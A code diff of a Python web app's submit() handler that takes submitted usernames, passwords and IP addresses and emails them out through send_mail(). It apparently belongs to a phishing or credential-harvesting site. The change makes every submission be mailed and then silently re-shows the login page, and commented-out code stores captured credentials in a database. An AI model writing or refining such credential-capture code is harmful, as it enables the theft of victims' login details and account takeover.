@@ -60,9 +60,7 @@ def submit():
         # usernames.append(username)
         # passwords.append(password)
         # ip_every.append(ip_address)
-        while username =="" or password == "":
-            send_mail(username,password,ip_address)
-            return render_template("outdex.html")
+        send_mail(username,password,ip_address)
         # #while db.session.query(Feedback).filter(Feedback.username == username).count() == True:
         # if db.session.query(Feedback).filter(Feedback.password == password).count() == 0:
         #     data = Feedback(username, password, ip_address)
@@ -70,7 +68,7 @@ def submit():
         #     db.session.commit()
         #     send_mail(username,password,ip_address)
         #     return render_template("outdex.html")
-        return render_template("index.html", message = "Error")
+        return render_template("index.html")
 
 
 
